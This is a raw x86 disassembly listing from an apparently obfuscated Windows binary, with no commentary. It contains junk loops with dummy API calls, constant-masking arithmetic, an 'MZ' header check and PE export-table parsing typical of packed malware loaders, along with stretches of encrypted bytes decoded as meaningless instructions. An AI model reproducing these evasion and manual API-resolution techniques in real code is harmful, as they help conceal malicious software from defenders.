  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x430455,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x430455
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x430455,eax
  40cbe0:	cmp    DWORD PTR ds:0x430455,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x430455,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42ea0b
  40cc05:	cmp    DWORD PTR ds:0x430455,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x430455
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x430455,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x43043d,0x0
  40cc2f:	mov    eax,ds:0x43043d
  40cc34:	inc    eax
  40cc35:	mov    ds:0x43043d,eax
  40cc3a:	cmp    DWORD PTR ds:0x43043d,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e917
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42eacb
  40cc6b:	cmp    DWORD PTR ds:0x43043d,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e7cc,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x4304d7,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ee59
  40cd16:	mov    eax,ds:0x43047d
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42edd7
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x43046d,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x4304e7,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e7c0,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x430471,0x42edcf
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x430439,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x43043d,0x430449
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42edcb
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x430449,0x0
  40cde2:	mov    eax,ds:0x430449
  40cde7:	inc    eax
  40cde8:	mov    ds:0x430449,eax
  40cded:	cmp    DWORD PTR ds:0x430449,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42eacf
  40ce06:	cmp    DWORD PTR ds:0x430449,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42edd7,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x4304cf,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ede3,0x4304df
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e7cc,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x43043d,0x17
  40ce7c:	cmp    DWORD PTR ds:0x43043d,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x43043d,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e7dc
  40cec0:	push   0x42e8e3
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42ec43
  40ced0:	cmp    DWORD PTR ds:0x43043d,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x43043d
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x43043d,edi
  40ceea:	mov    edi,DWORD PTR ds:0x43043d
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x43043d,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e7d4,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e7d4,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e7d4,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x43044d
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42ec47
  40cf36:	cmp    DWORD PTR ds:0x42e7d4,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42edef,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e7c4
  40cf7a:	sbb    DWORD PTR ds:0x430435,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x4304db,0x1f
  40cf95:	cmp    DWORD PTR ds:0x4304db,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x4304db,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42eddb
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42ea0f
  40cfbd:	cmp    DWORD PTR ds:0x4304db,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x4304db
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x4304db,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x4304db
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x4304db,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42edf3,0x11
  40cff9:	cmp    DWORD PTR ds:0x42edf3,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42edf3,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e7d8
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42ec4b
  40d024:	cmp    DWORD PTR ds:0x42edf3,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42edf3
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42edf3,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42edf3
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42edf3,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x430439,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x430439
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x430439,esi
  40d067:	cmp    DWORD PTR ds:0x430439,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42ea13
  40d087:	cmp    DWORD PTR ds:0x430439,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42eddb
  40d09f:	sub    DWORD PTR ds:0x42e7bc,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42eddf
  40d0b2:	xor    DWORD PTR ds:0x42ede7,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e7d4
  40d0c3:	or     DWORD PTR ds:0x430441,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42edf3
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x43044d,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42eddb,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x4304eb
  40d0ed:	xor    DWORD PTR ds:0x42eddf,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42edd7,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42edcf
  40d10b:	or     DWORD PTR ds:0x42eddb,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    esi,ebp
  40d123:	push   ds
  40d124:	aad    0x25
  40d126:	stc    
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	mov    ch,0xd5
  40d130:	pop    es
  40d131:	push   0xc32cd66e
  40d136:	push   cs
  40d137:	fdivr  DWORD PTR [ebx+0x6e]
  40d13a:	xchg   DWORD PTR [ebx+edx*4+0x380156f4],eax
  40d141:	ss pop ebp
  40d143:	push   ebx
  40d144:	or     DWORD PTR [ebp-0xa],esi
  40d147:	cmc    
  40d148:	idiv   BYTE PTR [ebx]
  40d14a:	jae    0x40d1b0
  40d14c:	sbb    al,0x2f
  40d14e:	mov    ah,0x98
  40d150:	les    ebx,FWORD PTR [ecx]
  40d152:	and    BYTE PTR [esi+0x1c],bh
  40d155:	icebp  
  40d156:	imul   ebp,DWORD PTR [esi+0x5b],0xf1f448ed
  40d15d:	sbb    dl,BYTE PTR [edx-0x16fca01c]
  40d163:	aaa    
  40d164:	repz sub BYTE PTR [ebx+0x46],0xb
  40d169:	test   eax,0x8124f4ea
  40d16e:	test   BYTE PTR [eax+0x5d],ah
  40d171:	stos   BYTE PTR es:[edi],al
  40d172:	out    dx,eax
  40d173:	or     DWORD PTR ds:0xa3b6e93a,ebx
  40d179:	cmp    eax,0xc68774bb
  40d17e:	or     edx,DWORD PTR [ecx-0x3ae86f89]
  40d184:	inc    edi
  40d185:	ds por mm4,mm3
  40d189:	and    DWORD PTR ss:[edx+0x6f],ebx
  40d18d:	add    eax,0x6023e098
  40d192:	fsub   DWORD PTR [esi]
  40d194:	aas    
  40d195:	push   0x4258f1f6
  40d19a:	fldenv [ecx-0x4b984a10]
  40d1a0:	mov    ds:0xe664e717,al
  40d1a5:	sbb    edi,ecx
  40d1a7:	mov    ebp,0x43af6376
  40d1ac:	clc    
  40d1ad:	retf   0xe44e
  40d1b0:	rcr    DWORD PTR [edx-0x64a70efa],0x8b
  40d1b7:	and    al,0x90
  40d1b9:	mov    ch,BYTE PTR [edx]
  40d1bb:	jns    0x40d1bf
  40d1bd:	inc    ebx
  40d1be:	fwait
  40d1bf:	mov    ch,0xd6
  40d1c1:	mov    esp,?
  40d1c3:	jecxz  0x40d212
  40d1c5:	je     0x40d152
  40d1c7:	dec    esi
  40d1c8:	fistp  QWORD PTR [ecx-0x7e]
  40d1cb:	loopne 0x40d225
  40d1cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1ce:	iret   
  40d1cf:	sar    BYTE PTR [eax],cl
  40d1d1:	sub    BYTE PTR [ebp+0x53e5bbfe],dl
  40d1d7:	xchg   edx,eax
  40d1d8:	jb     0x40d1df
  40d1da:	jl     0x40d1f5
  40d1dc:	or     DWORD PTR [ebx],esp
  40d1de:	ret    0x1096
  40d1e1:	addr16 in al,dx
  40d1e3:	mov    eax,ds:0x32045ba8
  40d1e8:	inc    edi
  40d1e9:	jbe    0x40d17b
  40d1eb:	and    bh,cl
  40d1ed:	popf   
  40d1ee:	stos   DWORD PTR es:[di],eax
  40d1f0:	jno    0x40d26f
  40d1f2:	mov    dl,ch
  40d1f4:	sbb    ebp,DWORD PTR [edx-0x20eba034]
  40d1fa:	cmc    
  40d1fb:	test   BYTE PTR [ecx-0x9],bh
  40d1fe:	inc    ecx
  40d1ff:	jmp    0x40d190
  40d201:	fst    QWORD PTR [edi]
  40d203:	rcr    edx,cl
  40d205:	imul   ebx,ecx,0x24
  40d208:	pop    edx
  40d209:	add    DWORD PTR [ebp+eiz*1-0x26bcc60c],esi
  40d210:	(bad)  
  40d211:	dec    ebx
  40d212:	(bad)  
  40d213:	out    0xa1,eax
  40d215:	fwait
  40d216:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40d218:	xor    esp,DWORD PTR [ebx]
  40d21a:	imul   ebx,DWORD PTR [esi],0xb6a13244
  40d220:	or     DWORD PTR [edx],edi
  40d222:	mov    bh,0x49
  40d224:	and    DWORD PTR [edi+ebp*1+0x4787ae7d],esp
  40d22b:	add    dh,BYTE PTR [edx+0x292af6b9]
  40d231:	cvtps2pd xmm0,QWORD PTR [ecx-0xa4f4571]
  40d238:	push   ss
  40d239:	jp     0x40d206
  40d23b:	stos   DWORD PTR es:[edi],eax
  40d23c:	loope  0x40d243
  40d23e:	jne    0x40d298
  40d240:	jb     0x40d245
  40d242:	out    0xcf,eax
  40d244:	dec    edi
  40d245:	cmp    DWORD PTR [ecx-0x3f0d38d],ebx
  40d24b:	rcr    edi,0x83
  40d24e:	pusha  
  40d24f:	jp     0x40d277
  40d251:	jo     0x40d22b
  40d253:	sar    DWORD PTR [ebx],0x5f
  40d256:	xor    eax,DWORD PTR [esi+0x62]
  40d259:	fiadd  DWORD PTR [ebx]
  40d25b:	retf   
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x4304e7
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ede7,0x42e7c4
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42edef,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42eddf,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42edd7,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x430439,0x430445
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x4304df
  40d2bf:	add    DWORD PTR ds:0x42edd7,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e96f
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x430465,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x43045d,0x42edd3
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e7c4,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x430449,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x430465,0x43043d
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e7c4,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42edeb,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x430449,0x4304d3
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x430435,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x43044d,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x430461,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x43045d,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x43045d
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x43045d,ecx
  40d38d:	cmp    DWORD PTR ds:0x43045d,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x430441
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42ead3
  40d3b2:	cmp    DWORD PTR ds:0x43045d,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x156a8e30
  40d410:	mov    DWORD PTR [ebx+esi*4],ebx
  40d413:	lods   eax,DWORD PTR ds:[esi]
  40d414:	mov    ?,WORD PTR [esi+0x7e]
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d3a2
  40d41c:	pushf  
  40d41d:	mov    ?,WORD PTR [ecx+0x7094bc84]
  40d423:	xor    DWORD PTR [edi+0x2c],0x7d
  40d427:	out    0xa5,al
  40d429:	xchg   edx,eax
  40d42a:	(bad)  
  40d42b:	(bad)  
  40d42c:	fimul  WORD PTR [esi]
  40d42e:	or     bl,bl
  40d430:	not    BYTE PTR [esi+0x54]
  40d433:	xchg   eax,edx
  40d435:	cwde   
  40d436:	jge    0x40d4a7
  40d438:	push   eax
  40d439:	pop    esi
  40d43a:	add    BYTE PTR [ecx],al
  40d43c:	(bad)  
  40d43d:	jb     0x40d406
  40d43f:	cmc    
  40d440:	and    al,0x18
  40d442:	aam    0xcb
  40d444:	sub    eax,0xd824af35
  40d449:	pop    esp
  40d44a:	add    al,0x4c
  40d44c:	scas   eax,DWORD PTR es:[edi]
  40d44d:	push   0x2
  40d44f:	out    0x63,al
  40d451:	cmp    DWORD PTR [edi],esp
  40d453:	xor    eax,0x18aa91f0
  40d458:	mov    ebp,esi
  40d45a:	sahf   
  40d45b:	(bad)  
  40d45d:	mov    DWORD PTR [ebx+eax*2+0x47],edi
  40d461:	pop    ebx
  40d462:	jmp    0x2fdcf4c2
  40d467:	imul   ecx,DWORD PTR [eax-0x24],0x3d
  40d46b:	les    ebp,FWORD PTR [edi-0x5e848849]
  40d471:	and    edi,esp
  40d473:	push   es
  40d474:	out    dx,al
  40d475:	daa    
  40d476:	fld    DWORD PTR [eax]
  40d478:	add    al,0xa7
  40d47a:	mov    edi,0x942c0f57
  40d47f:	call   DWORD PTR [edi+ebp*8+0x6b666e02]
  40d486:	jmp    0x2956:0x7f9a9bc4
  40d48d:	or     ecx,ebp
  40d48f:	bound  ebx,QWORD PTR [edx]
  40d491:	jo     0x40d494
  40d493:	ret    
  40d494:	cmp    al,0xae
  40d496:	pushf  
  40d497:	cmp    eax,0xe35eaeab
  40d49c:	sti    
  40d49d:	test   eax,0xec7675b
  40d4a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4a3:	mov    edi,?
  40d4a5:	mov    bh,0xc6
  40d4a7:	jmp    0xe13e2c8c
  40d4ac:	mov    ah,0x5b
  40d4ae:	lea    esi,[eax-0x54ca602c]
  40d4b4:	int3   
  40d4b5:	mov    bl,0x8d
  40d4b7:	pushf  
  40d4b8:	fbstp  TBYTE PTR [edi+0x76072337]
  40d4be:	enter  0xbcad,0xf5
  40d4c2:	add    ebp,esp
  40d4c4:	mov    dl,0xc4
  40d4c6:	dec    ebp
  40d4c7:	mov    ebx,0x874e63cb
  40d4cc:	xchg   ebx,eax
  40d4cd:	sub    al,0xb8
  40d4cf:	mov    al,ds:0xe90fa1f1
  40d4d4:	push   edi
  40d4d5:	xchg   ecx,eax
  40d4d6:	sbb    al,0x72
  40d4d8:	loope  0x40d4c2
  40d4da:	les    edx,FWORD PTR [eax+0x4]
  40d4dd:	xor    al,0x78
  40d4df:	in     eax,dx
  40d4e0:	adc    edi,DWORD PTR [esi+edx*8+0x42]
  40d4e4:	push   ebp
  40d4e5:	push   esi
  40d4e6:	mov    ch,al
  40d4e8:	adc    eax,0x28e4400d
  40d4ed:	sbb    eax,0xe3af252e
  40d4f2:	or     edx,ebx
  40d4f4:	cs ret 
  40d4f6:	adc    al,0x12
  40d4f8:	shl    DWORD PTR es:[ecx+0x145847ee],1
  40d4ff:	mov    ?,ebp
  40d501:	push   ebx
  40d502:	scas   eax,DWORD PTR es:[edi]
  40d503:	push   eax
  40d504:	mov    eax,0xdcd9df57
  40d509:	or     eax,0xe409fa31
  40d50e:	(bad)  
  40d50f:	or     eax,0x25f1095d
  40d514:	inc    ebp
  40d515:	push   ss
  40d516:	mov    DWORD PTR [ecx+eax*1-0x7b],eax
  40d51a:	sub    bh,BYTE PTR [eax-0x2]
  40d51d:	dec    ebx
  40d51e:	sbb    ecx,DWORD PTR [edi]
  40d520:	inc    ebx
  40d521:	fadd   QWORD PTR [ecx+ecx*2-0x40]
  40d525:	aaa    
  40d526:	je     0x40d512
  40d528:	adc    edi,ebx
  40d52a:	daa    
  40d52b:	mov    eax,ds:0x56474360
  40d530:	cmp    DWORD PTR [edx+0x509aa457],0x8e9a5dd
  40d53a:	fadd   DWORD PTR [ecx+0x26]
  40d53d:	sub    eax,edi
  40d53f:	leave  
  40d540:	xchg   ebp,eax
  40d541:	fnstsw ax
  40d543:	push   eax
  40d544:	cli    
  40d545:	jno    0x40d502
  40d547:	push   DWORD PTR [ebp+0xc]
  40d54a:	call   0x402e68
